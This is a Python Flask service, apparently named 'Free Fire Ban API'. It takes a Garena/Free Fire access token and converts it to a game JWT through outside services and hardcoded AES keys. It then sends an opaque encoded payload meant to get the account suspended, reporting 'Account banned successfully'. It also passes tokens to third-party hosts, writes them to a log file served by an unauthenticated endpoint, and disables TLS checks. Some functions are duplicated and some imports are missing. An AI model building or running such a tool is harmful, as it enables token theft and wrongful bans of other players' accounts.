from flask import Flask, request, jsonify
import json
import base64
import requests
import urllib3
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

urllib3.disable_warnings()

app = Flask(__name__)

# ====================== THÊM LOGGING ======================
import logging
import sys

# Cấu hình logging chi tiết
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(filename)s:%(lineno)d - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/ban_api_debug.log')
    ]
)
logger = logging.getLogger(__name__)


# ====================== SỬA HÀM fetch_majorlogin_jwt CÓ DEBUG ======================
def fetch_majorlogin_jwt(token):
    logger.info(f"===== START fetch_majorlogin_jwt =====")
    logger.info(f"Token input: {token[:50]}..." if len(token) > 50 else f"Token input: {token}")
    logger.info(f"Token length: {len(token)}")
    logger.info(f"Token starts with 'eyJ': {token.startswith('eyJ')}")
    logger.info(f"Token contains '.' : {'.' in token}")
    
    token = token.strip()
    
    # TRƯỜNG HỢP 1: ĐÃ LÀ JWT
    if token.startswith("eyJ") and token.count('.') == 2:
        logger.info("Case 1: Token looks like JWT")
        try:
            decoded = decode_jwt(token)
            logger.info(f"Decoded JWT: {json.dumps(decoded, default=str)[:200]}")
            if decoded.get('account_id'):
                logger.info("JWT valid, returning directly")
                return token, decoded, None
            else:
                logger.warning("JWT decoded but no account_id")
        except Exception as e:
            logger.error(f"Error decoding JWT: {str(e)}")
    
    # TRƯỜNG HỢP 2: ACCESS TOKEN - CONVERT QUA API
    logger.info("Case 2: Trying to convert via jwt-caidb API")
    try:
        convert_url = f"https://jwt-caidb.vercel.app/convert/{token}"
        logger.info(f"Calling: {convert_url}")
        resp = requests.get(convert_url, timeout=10)
        logger.info(f"Response status: {resp.status_code}")
        
        if resp.status_code == 200:
            data = resp.json()
            logger.info(f"API response: {json.dumps(data, default=str)[:300]}")
            
            if data.get('success') and data.get('jwt_token'):
                jwt_token = data['jwt_token']
                decoded = data.get('decoded', {})
                logger.info(f"Convert success! JWT: {jwt_token[:50]}...")
                logger.info(f"Decoded: {json.dumps(decoded, default=str)[:200]}")
                return jwt_token, decoded, None
            else:
                logger.warning(f"API returned success=False: {data.get('error', 'unknown')}")
        else:
            logger.error(f"API returned status {resp.status_code}")
    except Exception as e:
        logger.error(f"Error calling convert API: {str(e)}")
    
    # TRƯỜNG HỢP 3: EXTRACT OPEN_ID
    logger.info("Case 3: Trying to extract Open ID from token")
    oId = None
    
    # Cách 1: API inspect Garena
    try:
        logger.info("Trying Garena OAuth inspect API...")
        r = requests.get(
            f"https://100067.connect.garena.com/oauth/token/inspect?token={token}",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=5
        )
        logger.info(f"Inspect API status: {r.status_code}")
        if r.status_code == 200:
            data = r.json()
            logger.info(f"Inspect response: {json.dumps(data, default=str)[:200]}")
            oId = data.get("open_id")
            logger.info(f"Extracted open_id: {oId}")
    except Exception as e:
        logger.error(f"Error calling inspect API: {str(e)}")
    
    # Cách 2: API reward
    if not oId:
        try:
            logger.info("Trying Reward API...")
            headers = {"access-token": token, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get(
                "https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/",
                headers=headers,
                verify=False,
                timeout=5
            )
            logger.info(f"Reward API status: {uid_res.status_code}")
            
            if uid_res.status_code == 200:
                uid_data = uid_res.json()
                logger.info(f"Reward response: {json.dumps(uid_data, default=str)[:200]}")
                uid = uid_data.get("uid")
                
                if uid:
                    logger.info(f"Extracted UID: {uid}")
                    openid_res = requests.post(
                        "https://topup.pk/api/auth/player_id_login",
                        headers={"Content-Type": "application/json"},
                        json={"app_id": 100067, "login_id": str(uid)},
                        verify=False,
                        timeout=5
                    )
                    logger.info(f"Topup API status: {openid_res.status_code}")
                    
                    if openid_res.status_code == 200:
                        openid_data = openid_res.json()
                        logger.info(f"Topup response: {json.dumps(openid_data, default=str)[:200]}")
                        oId = openid_data.get("open_id")
                        logger.info(f"Extracted open_id: {oId}")
        except Exception as e:
            logger.error(f"Error in reward/topup flow: {str(e)}")
    
    if not oId:
        logger.error("FAILED: Cannot extract Open ID from token")
        return None, None, "Cannot extract Open ID from token. Token may be invalid or expired."
    
    logger.info(f"Open ID extracted successfully: {oId}")
    
    # TRƯỜNG HỢP 4: MajorLogin
    logger.info("Case 4: Trying MajorLogin with platforms...")
    platforms = [8, 3, 4, 6]
    
    for p_type in platforms:
        logger.info(f"Trying platform {p_type}...")
        try:
            pl = build_majorlogin(token, oId, p_type)
            logger.info(f"MajorLogin payload built, size: {len(pl)} bytes")
            
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            logger.info(f"MajorLogin response status: {x.status_code}")
            logger.info(f"Response size: {len(x.content)} bytes")
            
            if x.status_code == 200:
                # Thử decrypt
                try:
                    decrypted = dec(x.content)
                    hex_data = decrypted.hex()
                    logger.info(f"Decrypted successfully, hex length: {len(hex_data)}")
                except Exception as e:
                    logger.error(f"Decrypt failed: {str(e)}")
                    hex_data = x.content.hex()
                    logger.info(f"Raw hex length: {len(hex_data)}")
                
                parsed = get_available_room(hex_data)
                logger.info(f"Parsed fields: {list(parsed.keys())}")
                
                # Tìm JWT
                for key, value in parsed.items():
                    data_val = value.get('data', '')
                    logger.info(f"Field {key}: type={type(data_val)}, len={len(str(data_val))}")
                    
                    if isinstance(data_val, str) and len(data_val) > 50:
                        if data_val.startswith("eyJ") or ('.' in data_val and len(data_val.split('.')) == 3):
                            logger.info(f"Found JWT in field {key}!")
                            logger.info(f"JWT: {data_val[:100]}...")
                            return data_val, decode_jwt(data_val), None
                
                logger.warning(f"No JWT found in response for platform {p_type}")
            else:
                logger.warning(f"MajorLogin failed with status {x.status_code}")
        except Exception as e:
            logger.error(f"Error in MajorLogin platform {p_type}: {str(e)}")
    
    logger.error("FAILED: All MajorLogin platforms failed")
    return None, None, "MajorLogin failed. Account may be blocked."


# ====================== THÊM ENDPOINT DEBUG ======================
@app.route('/debug', methods=['GET'])
def debug_info():
    """Endpoint debug để kiểm tra token"""
    token = request.args.get('token', '')
    
    if not token:
        return jsonify({
            'status': 'error',
            'message': 'Missing token parameter',
            'usage': '/debug?token=your_token_here'
        })
    
    result = {
        'token_input': token[:50] + '...' if len(token) > 50 else token,
        'token_length': len(token),
        'token_starts_eyJ': token.startswith('eyJ'),
        'token_dot_count': token.count('.'),
        'debug_logs': []
    }
    
    # Test JWT decode trực tiếp
    if token.startswith('eyJ') and token.count('.') == 2:
        try:
            decoded = decode_jwt(token)
            result['jwt_decode_success'] = True
            result['jwt_payload'] = decoded
            result['expired'] = decoded.get('exp', 0) < time.time() if decoded.get('exp') else 'unknown'
        except Exception as e:
            result['jwt_decode_success'] = False
            result['jwt_decode_error'] = str(e)
    
    # Test convert API
    try:
        convert_url = f"https://jwt-caidb.vercel.app/convert/{token}"
        resp = requests.get(convert_url, timeout=10)
        result['convert_api_status'] = resp.status_code
        if resp.status_code == 200:
            result['convert_api_response'] = resp.json()
    except Exception as e:
        result['convert_api_error'] = str(e)
    
    return jsonify(result)


# ====================== THÊM ENDPOINT XEM LOG ======================
@app.route('/log', methods=['GET'])
def view_log():
    """Xem log debug (chỉ hoạt động trên Render)"""
    try:
        if os.path.exists('/tmp/ban_api_debug.log'):
            with open('/tmp/ban_api_debug.log', 'r') as f:
                logs = f.read().split('\n')[-100:]  # 100 dòng cuối
            return jsonify({
                'success': True,
                'logs': '\n'.join(logs)
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Log file not found'
            })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })


# ====================== THÊM IMPORT os ======================
import os

# ====================== CONSTANTS (giữ nguyên từ ban.py) ======================
API_URL = 'https://clientbp.ggpolarbear.com/GetLoginData'
BODY_BASE64 = (
    'vGkQhkkYHjne06dPbmJgb36BQ1NdLgk8J+uc+z4/9t4OZ19iWMyn5cH/Pe/DgGHrwHxJ+dRKGho2LCErl+rBWEf/6aWcFflRXiEsvPiGKM3809a+vci8mAQBREdizRWQ6bdeLnlztsqBvlB5OU8WFlmGxsU8UY1U3Zp/eLNTbq0DHqjOxziR+ylXgLlonsckeKvaxa4YE540eXi+9v4ilJunUubievpqUip6XDAyKV7o1spVxiaP0z4d8MLosbeYthPAnK5ykeE8IpnYaru0oDN8o90r820h04frRPJBszlDiarwdjgXaiyeQqAiOgEN63gUoVq2rd0JfYGaHN2f2kJxxO9uCYxyJ6IhCzQq8yAJT2asKa9u7gWB1bB/fJxq4nVxY8am8DI+rqIDvVSF3EdQBDh9qipPFCd0gZx7kDVg/9vM79YAE+FnDgGY3D/niKWsu66SL9+bRcghZxcCMOzKwvRe7hCRU2pDjBw0MRvPnCCa9KpEuO4CgWz+++SP9whlI0dWCi9/snDCN6i9V2TYrSWfbg1i2TRipquGUoi/cP1xPBeMwQlzlf4APMQzvT8MOQotqry+y1+koTpwRKlWgu7QLmiumn4dwd9HARVMThSH46kwlD8xep4sLVf6/BbjWixBMVRKFi1w9zpVVe+w6rBYhtBHXfjqjg2sCzF1mlBabMbW4L2yXEmABaQG/l0jmaGEWh6kzMY9T1nzV1Wcw5lF7X+pwQEnAn6i5coowNGKrTGUJ2wa3+tAxGcm9zozCvj8yd2pOXmta46GoREDQk+U99uHHvjqzsSNeBq8ffL5zibtv0pZPhnUuSP76YkhCcdtDilaecBElnt9eFfo8cy2B3Z0wbhG20nKNfYuhgZMZuSPRjmQphlfyl1hpoSG5xMQ7bdqZAkoTkZlFpCL4y02yUlImI7Z8jnA3i4un3UOq1rXrMza+bqNsMhrJ/aUS3mnoXr23yzuUc56zyYQtzJx6VCupsHraP7brcDbBS76Gp2o0oT2iE4Y55ZyAEgdt307DzJknHEHdGuoOG4Yzy5bI7HnukmnUjoiIdJEr7iJdOLppdB+ZDXPkHps5ysskdapRp0i2x1gMpW9XU1LY1cNAsTmAvHcz2GZA2OjtvS0roiay2rkUqNgmN8cPygK3j6ycfpkHc1PkUnmG1CNjMy3qP7c18qvDdSYfiq99Wra4l5L2dV3dE/kGpc1fgwWo94UPIes67wg/TrRR85GxPcpIX3IUOGMyEX1VWJTS2PvTm3S4xrerobDKG5V'
)

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'
mLuRl = "https://loginbp.ggpolarbear.com/MajorLogin"

mLhDr = {
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-S908E Build/TP1A.220624.014)",
    "Connection": "Keep-Alive",
    "Accept-Encoding": "gzip",
    "Content-Type": "application/octet-stream",
    "Expect": "100-continue",
    "X-GA": "v1 1",
    "X-Unity-Version": "2018.4.11f1",
    "ReleaseVersion": "OB53"
}

# ====================== CLASS & FUNCTIONS (giữ nguyên) ======================
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str):
            value = value.encode('utf-8')
        res = bytearray()
        res.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        res.extend(SimpleProtobuf.encode_varint(len(value)))
        res.extend(value)
        return bytes(res)

    @staticmethod
    def create_login_payload(open_id, access_token, platform):
        payload = bytearray()
        curr = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        payload.extend(SimpleProtobuf.encode_string(3, curr))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, platform))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_string(99, platform))
        return bytes(payload)

def enc(d):
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

def decode_ff_name(b64_str):
    try:
        if not b64_str:
            return "Unknown"
        key = b"1e5898ccb8dfdd921f9bdea848768b64a201"
        b64_str = b64_str.strip()
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        encrypted_bytes = base64.b64decode(b64_str)
        decrypted_bytes = bytearray()
        for i, byte in enumerate(encrypted_bytes):
            key_byte = key[i % len(key)]
            decrypted_bytes.append(byte ^ key_byte)
        return decrypted_bytes.decode('utf-8', errors='ignore') or "Unknown"
    except Exception:
        return "Unknown"

def decode_jwt(token):
    try:
        payload_part = token.split('.')[1]
        payload_part += "=" * ((4 - len(payload_part) % 4) % 4)
        decoded_bytes = base64.urlsafe_b64decode(payload_part)
        return json.loads(decoded_bytes.decode('utf-8'))
    except Exception:
        return {}

def get_available_room(hex_data):
    try:
        data = bytes.fromhex(hex_data)
        result = {}
        index = 0
        while index < len(data):
            tag = data[index]
            field_num = tag >> 3
            wire_type = tag & 0x07
            index += 1
            if wire_type == 0:
                val = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    val |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                result[str(field_num)] = {"data": val}
            elif wire_type == 2:
                length = 0
                shift = 0
                while index < len(data):
                    byte = data[index]
                    index += 1
                    length |= (byte & 0x7F) << shift
                    if not (byte & 0x80):
                        break
                    shift += 7
                val_bytes = data[index:index + length]
                index += length
                try:
                    result[str(field_num)] = {"data": val_bytes.decode('utf-8')}
                except:
                    result[str(field_num)] = {"data": val_bytes.hex()}
            else:
                break
        return result
    except:
        return {}

def build_majorlogin(tok, open_id, p_type):
    return enc(SimpleProtobuf.create_login_payload(open_id, tok, str(p_type)))

def fetch_majorlogin_jwt(token):
    # Nếu đã là JWT
    if token.startswith("ey") and "." in token:
        return token, decode_jwt(token), None

    # Extract open_id
    oId = None
    try:
        r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token}", 
                         headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
        if r.status_code == 200:
            oId = r.json().get("open_id")
    except:
        pass

    if not oId:
        try:
            uid_headers = {"access-token": token, "user-agent": "Mozilla/5.0"}
            uid_res = requests.get("https://prod-api.reward.ff.garena.com/redemption/api/auth/inspect_token/", 
                                   headers=uid_headers, verify=False, timeout=5)
            if uid_res.status_code == 200:
                uid = uid_res.json().get("uid")
                if uid:
                    openid_res = requests.post("https://topup.pk/api/auth/player_id_login",
                                               headers={"Content-Type": "application/json"},
                                               json={"app_id": 100067, "login_id": str(uid)},
                                               verify=False, timeout=5)
                    if openid_res.status_code == 200:
                        oId = openid_res.json().get("open_id")
        except:
            pass

    if not oId:
        return None, None, "Failed to extract Open ID"

    platforms = [8, 3, 4, 6]
    for p_type in platforms:
        pl = build_majorlogin(token, oId, p_type)
        try:
            x = requests.post(mLuRl, headers=mLhDr, data=pl, timeout=10, verify=False)
            if x.status_code == 200:
                try:
                    decrypted = dec(x.content)
                    parsed = get_available_room(decrypted.hex())
                    for key, value in parsed.items():
                        if isinstance(value.get('data'), str) and len(value.get('data', '')) > 50 and '.' in value.get('data', ''):
                            return value.get('data'), decode_jwt(value.get('data')), None
                except:
                    parsed = get_available_room(x.content.hex())
                    for key, value in parsed.items():
                        if isinstance(value.get('data'), str) and len(value.get('data', '')) > 50 and '.' in value.get('data', ''):
                            return value.get('data'), decode_jwt(value.get('data')), None
        except Exception:
            continue

    return None, None, "MajorLogin failed"

def trigger_ban(jwt_token, version):
    headers = {
        'Authorization': f'Bearer {jwt_token}',
        'X-Unity-Version': '2018.4.11f1',
        'X-GA': 'v1 1',
        'ReleaseVersion': str(version),
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Dalvik/2.1.0 (Linux; Android)',
        'Accept-Encoding': 'gzip'
    }
    body = base64.b64decode(BODY_BASE64)
    return requests.post(API_URL, headers=headers, data=body, timeout=20, verify=False)


# ====================== API ENDPOINT ======================
@app.route('/ban', methods=['GET', 'POST'])
def ban_account():
    # Lấy token từ query param hoặc JSON body
    if request.method == 'GET':
        token = request.args.get('token') or request.args.get('access_token')
    else:
        data = request.get_json() or {}
        token = data.get('token') or data.get('access_token')
    
    if not token:
        return jsonify({
            'success': False,
            'error': 'Missing token parameter',
            'usage': 'GET /ban?token=<your_token_or_jwt> or POST {"token": "xxx"}'
        }), 400
    
    try:
        # Bước 1: Lấy JWT
        jwt_token, decoded, error = fetch_majorlogin_jwt(token)
        
        if not jwt_token:
            return jsonify({
                'success': False,
                'error': error or 'Failed to authenticate token',
                'token_provided': token[:20] + '...' if len(token) > 20 else token
            }), 401
        
        # Giải mã thông tin
        raw_nick = decoded.get('nickname', '')
        nickname = decode_ff_name(raw_nick)
        account_id = decoded.get('account_id', 'Unknown')
        region = decoded.get('lock_region', decoded.get('region', 'Unknown'))
        version = decoded.get('release_version', 'OB53')
        
        # Bước 2: Gửi payload ban
        ban_response = trigger_ban(jwt_token, version)
        
        if ban_response.status_code == 200:
            return jsonify({
                'success': True,
                'message': 'Account banned successfully',
                'target': {
                    'nickname': nickname,
                    'account_id': account_id,
                    'region': region,
                    'version': version
                },
                'status': 'SUSPENDED',
                'timestamp': datetime.now().isoformat()
            }), 200
        else:
            return jsonify({
                'success': False,
                'error': f'Ban payload failed with status {ban_response.status_code}',
                'target': {
                    'nickname': nickname,
                    'account_id': account_id,
                    'region': region
                }
            }), ban_response.status_code
            
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        }), 500


@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'name': 'Free Fire Ban API',
        'version': '1.0',
        'endpoints': {
            '/ban': 'GET or POST with token parameter'
        },
        'example': '/ban?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...'
    })


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=3636)
